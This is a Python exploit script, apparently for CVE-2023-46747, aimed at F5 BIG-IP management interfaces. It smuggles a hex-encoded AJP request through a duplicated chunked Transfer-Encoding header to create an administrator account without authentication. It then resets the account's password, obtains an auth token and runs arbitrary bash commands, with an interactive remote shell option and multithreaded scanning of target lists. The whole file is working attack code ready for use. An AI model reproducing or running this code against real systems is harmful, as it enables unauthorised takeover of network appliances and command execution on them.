import argparse
import binascii
import json
import random
import time
import urllib3
import requests
import threading
import signal
import sys
from queue import Queue
import os

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
    COLOR_SUPPORT = True
except ImportError:
    class ColorFallback:
        RESET = ''
        RED = ''
        GREEN = ''
        YELLOW = ''
        CYAN = ''
    Fore = Style = ColorFallback()
    COLOR_SUPPORT = False

urllib3.disable_warnings()

banner = f"""
{Fore.CYAN if COLOR_SUPPORT else ''}
  ______     _______     ____   ___ ____  _____       _  _    __ _____ _  _ _____ 
 / ___\\ \   / / ____|   |___ \\ / _ \\___ \\|___ /      | || |  / /|___  | || |___  |
| |    \\ \\ / /|  _| _____ __) | | | |__) | |_ \\ _____| || |_| '_ \\ / /| || |_ / / 
| |___  \\ V / | |__|_____/ __/| |_| / __/ ___) |_____|__   _| (_) / / |__   _/ /  
 \\____|  \\_/  |_____|   |_____|\\___/_____|____/         |_|  \\___/_/     |_|_/   
{Style.RESET_ALL if COLOR_SUPPORT else ''}                                                                            
{Fore.YELLOW if COLOR_SUPPORT else ''}Author: cediegreyhat | Github https://github.com/cediegreyhat{Style.RESET_ALL if COLOR_SUPPORT else ''}
"""

def signal_handler(sig, frame):
    print(f"\n{Fore.YELLOW if COLOR_SUPPORT else ''}[!] Interrupted by user. Exiting...{Style.RESET_ALL if COLOR_SUPPORT else ''}")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def generatesth(num):
    charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
    return ''.join(random.choice(charset) for _ in range(num))

def get_random_agent():
    agent_list = [
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.89 Safari/537.36'
    ]
    return random.choice(agent_list)

def unauth_create_user(target, username, password, proxy):
    login_request_hex = (
        "0008485454502f312e310000122f746d75692f436f6e74726f6c2f666f726d0000093132372e302e302e31000009"
        "6c6f63616c686f73740000096c6f63616c686f7374000050000003000b546d75692d44756262756600000b424242"
        "4242424242424200000a52454d4f5445524f4c450000013000a00b00096c6f63616c686f73740003000561646d69"
        "6e000501715f74696d656e6f773d61265f74696d656e6f775f6265666f72653d2668616e646c65723d253266746d"
        "756925326673797374656d25326675736572253266637265617465262626666f726d5f706167653d253266746d75"
        "6925326673797374656d253266757365722532666372656174652e6a737025336626666f726d5f706167655f6265"
        "666f72653d26686964654f626a4c6973743d265f62756676616c75653d"
        + binascii.hexlify(b"eIL4RUnSwXYoPUIOGcOFx2o00Xc").decode() +
        "265f62756676616c75655f6265666f72653d2673797374656d757365722d68696464656e3d5b5b2241646d696e69"
        "73747261746f72222c225b416c6c5d225d5d2673797374656d757365722d68696464656e5f6265666f72653d266e"
        "616d653d" + binascii.hexlify(username.encode()).decode() +
        "266e616d655f6265666f72653d267061737377643d" + binascii.hexlify(password.encode()).decode() +
        "267061737377645f6265666f72653d2666696e69736865643d782666696e69736865645f6265666f72653d00ff00"
    )
    login_data = b"204\r\n" + binascii.unhexlify(login_request_hex) + b"\r\n0\r\n\r\n"
    url = f"{target.rstrip('/')}/tmui/login.jsp"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Transfer-Encoding": "chunked, chunked",
        "User-Agent": get_random_agent()
    }
    try:
        resp = requests.post(url=url, headers=headers, data=login_data, verify=False, proxies=proxy)
        time.sleep(2)
        return resp.status_code == 200
    except:
        return False

def reset_passwd(target, user, passwd, proxy):
    url = f"{target.rstrip('/')}/mgmt/tm/auth/user/{user}"
    headers = {"Content-Type": "application/json"}
    try:
        resp = requests.patch(url, headers=headers, json={"password": passwd}, verify=False, proxies=proxy, auth=(user, passwd))
        time.sleep(2)
        return resp.status_code == 200
    except:
        return False

def get_token(target, user, passwd, proxy):
    url = f"{target}/mgmt/shared/authn/login"
    try:
        resp = requests.post(url, headers={"Content-Type": "application/json"},
                             json={"username": user, "password": passwd}, verify=False, proxies=proxy)
        time.sleep(2)
        if resp.status_code == 200:
            return json.loads(resp.content.decode())["token"]["token"]
    except:
        return ""

def exec_command(target, token, cmd, proxy):
    url = f"{target}/mgmt/tm/util/bash"
    headers = {
        "X-F5-Auth-Token": token,
        "Content-Type": "application/json"
    }
    cmd_json = {
        "command": "run",
        "utilCmdArgs": f"-c \"{cmd}\""
    }
    try:
        resp = requests.post(url, headers=headers, json=cmd_json, verify=False, proxies=proxy)
        if resp.status_code == 200 and "commandResult" in resp.text:
            return json.loads(resp.text)["commandResult"].rstrip('\n')
        else:
            return f"[!] Command failed: {cmd}"
    except Exception as e:
        return f"[!] Error: {e}"


def shell(target, token, proxy):
    print(f"[+] Entering interactive shell on {target}. Type 'exit' to quit.")
    try:
        while True:
            cmd = input(f"Shell@{target}> ").strip()
            if cmd.lower() in ['exit', 'quit']:
                print("[+] Exiting shell.")
                break
            elif cmd:
                output = exec_command(target, token, cmd, proxy)
                print(output)
    except KeyboardInterrupt:
        print("\n[!] Ctrl+C detected. Exiting shell.")


def exploit(target, proxy, shell_mode=False):
    u, p = generatesth(5), generatesth(12)
    print(f"[+] Attacking: {target}")
    if unauth_create_user(target, u, p, proxy) and reset_passwd(target, u, p, proxy):
        token = get_token(target, u, p, proxy)
        if token:
            print(f"[+] {target} is VULNERABLE. user: {u} pass: {p} token: {token}")
            if shell_mode:
                shell(target, token, proxy)
        else:
            print(f"[-] Failed to get token for {target}")
    else:
        print(f"[-] {target} is NOT vulnerable")

def worker(queue, proxy, shell_mode, check_only):
    while not queue.empty():
        target = queue.get()
        if not target.startswith("http"):
            target = "https://" + target
        if check_only:
            exploit(target, proxy, shell_mode=False)
        else:
            exploit(target, proxy, shell_mode)
        queue.task_done()

def main():
    parser = argparse.ArgumentParser()
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-f", "--file", help="File with list of targets")
    group.add_argument("-u", "--url", help="Single target URL")
    parser.add_argument("-p", "--proxy", help="Proxy (http://127.0.0.1:8080)", default=None)
    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of threads")
    parser.add_argument("--shell", action="store_true", help="Launch interactive shell if vulnerable")
    parser.add_argument("--check", action="store_true", help="Only check for vulnerability")
    args = parser.parse_args()
    
    
    targets = []
    if args.url:
            targets.append(args.url)
    elif args.file:
        with open(args.file, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]

    proxy = {"http": args.proxy, "https": args.proxy} if args.proxy else {}
    queue = Queue()
    for target in targets:
        queue.put(target)
   
   
    threads = []
    for _ in range(args.threads):
        t = threading.Thread(target=worker, args=(queue, proxy, args.shell, args.check))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

if __name__ == "__main__":
    print(banner)
    main()
